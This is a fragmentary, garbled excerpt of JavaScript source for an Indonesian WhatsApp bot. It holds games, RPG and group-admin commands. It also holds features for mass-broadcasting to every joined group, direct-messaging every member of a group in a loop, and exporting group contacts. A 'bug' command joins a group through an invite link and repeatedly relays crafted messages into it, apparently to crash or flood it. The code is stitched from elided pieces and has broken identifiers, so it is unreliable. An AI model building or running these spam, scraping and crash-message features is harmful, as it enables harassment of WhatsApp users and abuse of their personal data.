var capt = `❗ Note : Bot Akan Memberikan Hasil Acak. JIka Hasil Tidak Sesuai Dengan Yang Diinginkan, Silahkan Ketik Ulang .${command} ${q}
🔎 Search : ${q}
Maaf, tidak ada hasil yang ditemukan.`
sirchan.sendMessage(m.chat, capt, { quoted: m })
}
})
break
//=================================================//
...
`;
await sirchan.sendMessage(m.chat, { image: { url: json[0].thumbnail }, caption: capt }, { quoted: m })
}
break
//=================================================//
case 'search-sticker': {
...
await sleep(2000)
sirchan.sendMessage(args[0] + "@s.whatsapp.net", {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
}
}
break
//=================================================//
...
joreply("Sukses Via Nomer")
await sleep(2000)
sirchan.sendMessage(targetNumber, {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
} else {
...
let cek1 = await sirchan.onWhatsApp(prem1 + `@s.whatsapp.net`)
...
sirchan.sendMessage(prem1+'@s.whatsapp.net', {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah owner / kontributor bot`},{quoted: qpay})
}
break
//=================================================//
case 'delowner': {
...
await sleep(3500)
sirchan.sendMessage(prem1 + '@s.whatsapp.net', {
...
.then(({data}) => {
sirchan.sendMessage(m.chat, { image: {url: data.url }, caption: '✅Succes, Tapi Lu jan ngaceng Woi' },{quoted: m })
})
}
break
//=================================================//
...
case 'galaxystyle':
case 'lighteffects':{
if (!q) return joreply(`Example : ${prefix+command} sirchan`) 
joreply(mess.wait)
let link
...
sirchan.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
//=================================================//
case 'shadow': 
...
sirchan.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.success}` }, { quoted: m })
}
break
//=================================================//
...
sirchan.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
//=================================================//
case 'kiss': {
...
await sirchan.sendVideoAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author });
await sirchan.sendMessage(m.chat, { text: `@${m.sender.split("@")[0]} Mencium @${m.mentionedJid[0].split("@")[0]}`, contextInfo: { mentionedJid: [m.sender, m.mentionedJid], groupMentions: [{ groupJid: m.chat, groupSubject: 'anjay' }] } }, { quoted: m });
}
break
//=================================================//
case 'hug': {
...
let data = await mmk.json()
await sirchan.sendVideoAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author });
await sirchan.sendMessage(m.chat, { text: `@${m.sender.split("@")[0]} Memeluk @${m.mentionedJid[0].split("@")[0]}`, contextInfo: { mentionedJid: [m.sender, m.mentionedJid], groupMentions: [{ groupJid: m.chat, groupSubject: 'anjay' }] } }, { quoted: m });
}
break
//=================================================//
case 'nebang': {
...
let buatall = 1
sirchan.casino = sirchan.casino ? sirchan.casino : {}
if (m.chat in sirchan.casino) return reply ('Masih ada yang melakukan casino disini, tunggu sampai selesai!!')
else sirchan.casino[m.chat] = true
try {
...
joreply('Error!!')
if (DevMode) {
for (let jid of global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != sirchan.user.jid)) {
sirchan.sendMessage(jid, 'casino.js error\nNo: *' + m.sender.split`@`[0] + '*\nCommand: *' + m.text + '*\n\n*' + e + '*', MessageType.text)
}
}
} finally {
delete sirchan.casino[m.chat]
}
}
break
//=================================================//
...
case 'bankcek': {
if (!isGroup) return joreply(mess.ingroup)
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0]: m.fromMe ? sirchan.user.jid: m.sender
...
let caption = `
▧「 *BANK CEK* 」
│ 👤 Name: ${user.registered ? user.name: sirchan.getName(m.sender)}
...
let timers = clockString(_timers)
let name = sirchan.getName(m.sender)
let user = db.data.users[m.sender]
let id = m.sender
let kerja = 'Taxy'
sirchan.misi = sirchan.misi ? sirchan.misi : {}
if (id in sirchan.misi) {
joreply(`Selesaikan Misi ${sirchan.misi[id][0]} Terlebih Dahulu`)
throw false
}
...
${sortedItem.slice(page * 0, page * 5 + 5).map((user, i) => `${i + 1}.*﹙${user[type]}﹚*- ${participants.some(p => areJidsSameUser(user.jid, p.id)) ? `${user.registered ? user.name: sirchan.getName(user.jid)} \nwa.me/`: 'ғʀᴏᴍ ᴏᴛʜᴇʀ ɢʀᴏᴜᴩ\n @'}${user.jid.split`@`[0]}`).join`\n\n`}
`.trim()
...
let id = m.sender
let kerja = 'Berburu'
sirchan.sirchanrzingod.misi ? sirchan.misi : {}
if (id in sirchan.misi) {
return joreply( `Selesaikan Misi ${sirchan.misi[id][0]} Terlebih Dahulu`)
 }
if (new Date - user.lastmisi > 3600000) {
...
let hsl = `🕸 *Hasil Berburu ${user.registered ? user.name : sirchan.getName(m.sender)}* 
${hewan1 ? `
...
let username = sirchan.getName(who)
...
let kerja = 'Berkebun'
let id = m.chat
.misi = sirchan.misi ? sirchan.misi : {}
if (id in sirchan.misi) {
joreply(`Selesaikan Misi ${sirchan.misi[id][0]} Terlebih Dahulu`)
return false
}
...
case 'fighting':
 case 'fight': {
 if (!isGroup) return joreply(mess.ingroup)
sirchan.fight = sirchan.fight ? sirchan.fight: {}
let user = db.data.users[m.sender]
if (typeof sirchan.fight[m.sender] != "undefined" && sirchan.fight[m.sender] == true) return joreply(`Kamu masih bertarung.`)
...
joreply(`*Kamu* (level ${user.level}) menantang *${sirchan.getName(lawan)}* (level ${db.data.users[lawan].level}) dan sedang dalam pertarungan.\n\nTunggu 5 menit lagi dan lihat siapa yg menang.`)
sirchan.fight[m.sender] = true
await delay(300000)
let kesempatan = []
...
user.money += hadiah
user.limit += 1
joreply(`*${sirchan.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${sirchan.getName(lawan)}*\n\n*Kamu* (level ${user.level}) menang melawan *${sirchan.getName(lawan)}* (level ${db.data.users[lawan].level}) karena kamu ${alasanMenang[getRandom(0, alasanMenang.length - 1)]}\n\nHadiah . ${hadiah.toLocaleString()}\n+1 Limit`)
} else if (pointPemain < pointLawan) {
let denda = (pointLawan - pointPemain) * 100000
user.money -= denda
user.limit += 1
joreply(`*${sirchan.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${sirchan.getName(lawan)}*\n\n*Kamu* (level ${user.level}) kalah melawan *${sirchan.getName(lawan)}* (level ${db.data.users[lawan].level}) karena kamu ${alasanKalah[getRandom(0, alasanKalah.length - 1)]}\n\nMoney kamu berkurang ${denda.toLocaleString()}\n+1 Limit`)
} else {
joreply(`*${sirchan.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${sirchan.getName(lawan)}*\n\nHasil imbang kak, ga dapet apa apa`)
}
delete sirchan.fight[m.sender]
}
break
//=================================================//
case 'gajian': {
...
let isMods = [sirchan.decodeJid(sirchan.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
let isDeveloper = m.fromMe || isMods || [sirchan.decodeJid(sirchan.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && !isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
let isPrems = isDeveloper || new Date() - user.premiumTime < 0
...
let caption = `
🧑🏻‍🏫 ᴜsᴇʀ: *${user.registered ? user.name : sirchan.getName(who)}* ${user.level ? `
...
if (!item.match('limit') && db.chats[m.chat].rpg == false && isGroup) return dfail('rpg', m, sirchan)
let user = db.data.users[m.sender]
...
let timers = clockString(_timers)
let name = user.registered ? user.name: sirchan.getName(m.sender)
let id = m.sender
let kerja = 'Roket'
sirchan.misi = sirchan.misi ? sirchan.misi: {}
if (id in sirchan.misi) {
...
default:
return sirchan.sendButton( m.chat, caption, wm, null, [`⋮☰ Menu`, `.menu`], m)
}
}
} catch (err) {
joreply("Error\n\n\n" + err.stack)
...
let command_link = `wa.me/${sirchanuser.jid.split('@')[0]}?text=${encodeURIComponent(command_text)}`
let share_text = `
...
try {
sirchan.tembak = sirchan.tembak || { musuh: [], tembak: [] }
 if(/kiri/i.test(text)) {
...
if(sirchan.tembak.tembak.indexOf("🤠") == 0) {
sirchan.tembak.tembak = kiri[0]
} else if(sirchan.tembak.tembak.indexOf("🤠") == 1) {
sirchan.tembak.tembak = kiri[0]
} else if(sirchan.tembak.tembak.indexOf("🤠") == 2) {
sirchan.tembak.tembak = kiri[1]
} else if(sirchan.tembak.tembak.indexOf("🤠") == 3) {
sirchan.tembak.tembak = kiri[2]
} else if(sisirchanembak.tembak.indexOf("🤠") == 4) {
sirchan.tembak.tembak = kiri[3]
}

let pos = sirchan.tembak.musuh.join(" ") + "\n\n\n" + sirchan.tembak.tembak.join(" ")



if(sirchan.tembak.musuh.indexOf("🥷") === sirchan.tembak.tembak.indexOf("🤠")) return sirchan.sendButton(m.chat, pos, wm, [
['Tembak', `${command}koboy tembak`] 
])
return sirchan.sendButton(m.chat, pos, wm, [
...
if(sirchan.tembak.tembak.indexOf("🤠") == 0) {
sirchan.tembak.tembak = kanan[1]
} else if(sirchan.tembak.tembak.indexOf("🤠") == 1) {
sirchan.tembak.tembak = kanan[2]
} else if(sirchan.tembak.tembak.indexOf("🤠") == 2) {
sirchan.tembak.tembak = kanan[3]
} else if(sirchan.tembak.tembak.indexOf("🤠") == 3) {
sirchan.tembak.tembak = kanan[4]
} else if(sirchan.tembak.tembak.indexOf("🤠") == 4) {
sirchan.tembak.tembak = kanan[4]
}
...
if(sirchan.tembak.tembak.indexOf("🤠") == sirchan.tembak.musuh.indexOf("🥷")) {
sirchan.tembak = {}
...
sirchan.tembak.musuh = musuh
sirchan.tembak.tembak = aku
...
let e = String(err)
sirchan.sendMessage("923452696397@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
...
Ketik *nyerah* untuk menyerah dan mengakui kekalahan`;
if (room.x !== room.o) await sirchan.sendText(room.x, str, m, {
mentions: parseMention(str)
});
await sirchan.sendText(room.o, str, m, {
mentions: parseMention(str)
});
} else {
room = {
...
if (this.game) {
delete this.game;
sirchan.sendText(m.chat, `Berhasil delete session TicTacToe`, m);
} else if (!this.game) {
...
this.suit[id] = {
chat: await sirchan.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) sirchan.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
...
sirchan.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
...
let result = anu[Math.floor(Math.random() * anu.length)];
sirchan.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
...
let result = anu[Math.floor(Math.random() * anu.length)];
sirchan.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
...
let result = anu[Math.floor(Math.random() * anu.length)];
sirchan.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
...
let result = anu[Math.floor(Math.random() * anu.length)];
sirchan.sendImage(m.chat, result.url, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, m).then(() => {
...
if (!text) return joreply(`Example : ${prefix + command} sir, 7, 7, 2005, Mboh, 16, 11, 2004`) 
...
//=================================================//
case "artinama": {
if (!text) return joreply(`Example : ${prefix + command} sirt`) 
...
if (!text) return joreply(`Example : ${prefix + command} sir, 7, 7, 2005`) 
...
if (!text) return joreply(`Example : ${prefix + command} sir|Mboh`) 
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return joreply(anu.message)
sirchan.sendImage(m.chat,anu.message.gambar, `❋々 *Nama Anda :* ${anu.message.nama_anda}\n❋々 *Nama Pasangan :* ${anu.message.nama_pasangan}\n❋々 *Sisi Positif :* ${anu.message.sisi_positif}\n❋々 *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
//=================================================//
...
if (anu.status == false) return joreply(anu.message)
sirchan.sendImage(m.chat, anu.message.image, `❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Simbol Tarot :* ${anu.message.simbol_tarot}\n❋々 *Arti :* ${anu.message.arti}\n❋々 *Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case "fengshui": {
if (!text) return joreply(`Example : ${prefix + command} sir, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`) 
...
//=================================================//
case 'bagaimana': {
if (!text) return joreply( `Example : ${prefix + command} cara agar menjadi cewe yang sesuai dengan tipe nya sir >////<`)
...
//=================================================//
case 'bisakah': {
if (!text) return joreply( `Example : ${prefix + command} saya menjadi orang yang cakep seperti sir`)
...
//=================================================//
case 'apakah': {
if (!text) return joreply( `Example : ${prefix + command} sir cakep`)
...
sirchan.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
fs.unlinkSync(ran)
})
...
case 'tourl': {
joreply(mess.wait)
let media = await sirchan.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
...
await sirchan.groupRevokeInvite(m.chat).then((res) => joreply(`Sukses riset link group`)).catch((err) => joreply(jsonformat(err)))
}
break
//=================================================//
case 'infogc': {
if(!isGroup) return joreply("Hanya bisa di dalam group")
let _meta = await sirchan.groupMetadata(m.chat)
console.log(_meta)
let _img = await sirchan.profilePictureUrl(_meta.id, 'image') 
...
joreply(mess.wait)
try {
var ppimg = await sirchan.profilePictureUrl(m.chat, 'image')
} catch (err) {
console.log(err)
var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
await sirchan.sendMessage(m.chat, { image: { url: ppimg }}, { quoted: m })
break
//=================================================//
case 'closegroup': {
if (!isGroup) return joreply(`Khusus Group Bego`)
...
sirchan.groupSettingUpdate(m.chat, 'announcement')
...
setTimeout(() => {
var nomor = m.participant
sirchan.groupSettingUpdate(m.chat, 'not_announcement')
...
sirchan.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
//=================================================//
...
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
let response = await sirchan.groupInviteCode(m.chat)
sirchan.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'editdesk':{
...
await sirchan.groupUpdateDescription(m.chat, text)
...
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
if (!text) return joreply(`teks untuk subject nya mana bego`)
await sirchan.groupUpdateSubject(m.chat, text)
joreply('Gacor Kang,Sukses,🔥')
}
break
//=================================================//
...
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
 if (args[0] === 'open'){
await sirchan.groupSettingUpdate(m.chat, 'unlocked').then((res) => joreply(`Sukses Membuka Edit Info Group`)).catch((err) => joreply(jsonformat(err)))
 } else if (args[0] === 'close'){
await sirchan.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => joreply(jsonformat(err)))
 } else {
...
if (!isBotAdmins) return joreply(`Bot Bukan Admin Bego`)
if (args[0] === 'close'){
await sirchan.groupSettingUpdate(m.chat, 'announcement').then((res) => joreply(`Sukses Menutup Group`)).catch((err) => joreply(jsonformat(err)))
} else if (args[0] === 'open'){
await sirchan.groupSettingUpdate(m.chat, 'not_announcement').then((res) => joreply(`Sukses Membuka Group`)).catch((err) => joreply(jsonformat(err)))
} else {
 joreply(`Silahkan Ketik\nGroup Open\nGroup Close`)
 }
}
...
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await sirchan.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => joreply(util.format(res))).catch((err) => joreply(util.format(err)))
}
break
//=================================================//
case "add": {
...
if (!isBotAdmins) return joreply(`Bot Bukan Admin:(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await sirchan.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => joreply(util.format(res))).catch((err) => joreply(util.format(err)))
}
break
//=================================================//
case "demote": {
...
await sirchan.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => joreply(util.format(res))).catch((err) => joreply(util.format(err)))
}
break
//=================================================//
case 'setppgroup': {
...
var mediz = await sirchan.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
...
var memeg = await sirchan.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
joreply(`*Success Beb✅*`)
}
}
...
sirchan.sendMessage(m.chat, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
...
await sirchan.sendMessage(m.chat, { audio: koi, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
break
...
sirchan.sendFile(m.chat, phone.result, "", ``, m, false)
}
break
//=================================================//
case "sspc": {
...
sirchan.sendFile(m.chat, desktop.result, "", ``, m, false)
}
break
//=================================================//
case "sstablet": {
...
sirchan.sendFile(m.chat, tablet.result, "", ``, m, false)
}
break
...
await joreply(mess.wait)
let getGroups = await sirchan.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await sirchan.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await sirchan.downloadAndSaveMediaMessage(quoted)
memek = await uptotelegra(media)
await sirchan.sendMessage(xnxx, { image: { url: memek }, caption: text.split('|')[0]}, { quoted: m })
await sleep(text.split('|')[1])
} else {
await sirchan.sendMessage(xnxx, { text: text.split('|')[0] }, { quoted: m })
await sleep(text.split('|')[1])
}}
joreply(mess.succes);
}
...
for (let x of anu) {
let metadata2 = await sirchan.groupMetadata(x)
...
const metadata2 = await sirchan.groupMetadata(q.split("|")[0])
const colls = metadata2.participants
for (let mem of colls) {
sirchan.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] }, { quoted: m }
)
await sleep(1500)
}
joreply(mess.succes)
...
*${prefix+command}\n\nContoh : Sve sir Ganteng, Nama Mu Siapa? Mau Jadi Pacar Gw Gk?*
`
)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let pler of mem) {
sirchan.sendMessage(pler, { text: q }, { quoted: m })
await sleep(1500)
}
joreply(mess.succes)
}
...
media = await sirchan.downloadAndSaveMediaMessage(quoted)
memek = await uptotelegra(media)
await sirchan.sendMessage(men, { image: { url: memek }, caption: captny }, { quoted: m })
await sleep(1500)
await sirchan.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
} else {
await sirchan.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
...
await joreply(mess.wait)
const groupMetadataa = !m.isGroup? await sirchan.groupMetadata(`${text}`).catch(e => {}) : ""
...
await sirchan.sendMessage(m.sender, { document: fs.readFileSync("./dtbs/contacts.vcf"), fileName: "contacts.vcf", caption: 
`🌤️Succes Om, UwU
...
└────────────`
await sirchan.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m })
}
break
//=================================================//
case 'igstalk': {
...
└────────────`
 await sirchan.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m })
} catch {
...
sirchan.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*
...
await sirchan.sendMessage(m.chat, { text: messageText }, { quoted: m });
...
\`✅ Example\` : addsrv sircakep,26 Desember 2018,1,15,1,0/0,0
`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
...
let cpu = "50"
let disk = "1024"
let email = username + "Sir@sweetrabit.ml"
akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg" 
if (!u) return
let d = (await sirchan.onWhatsApp(u.split`@`[0]))[0] || {}
...
🔐 Password: ${password}
🔗 Url: ${domain}`
sirchan.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
...
joreply(mess.bugrespon)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await sirchan.groupAcceptInvite(result);
for (let j = 0; j < 5; j++) {
...
}), { userJid: m.chat, quoted: sirbug })
await sirchan.relayMessage(target, etc.message, { messageId: etc.key.id })
await sleep(700)
}
...
for (let j = 0; j < q; j++) {
await sirchan.sendVideoAsSticker(m.chat, mengkece, force, { packname: 'SirChan Md', author: 'SirChan' })
}
}
break
...
await sirchan.relayMessage(m.chat, etc.message, { messageId: etc.key.id })
}
...
await sirchan.relayMessage(m.chat, etc.message, { participant: { jid: m.chat }, messageId: etc.key.id })
await sleep(700)
}
}
break
...
peki = async () => {
sirchan.sendMessage(global.ownMain + '@s.whatsapp.net', {text: require('util').format(err)}, {quoted: m})
await sleep(1000)
m.reply(`
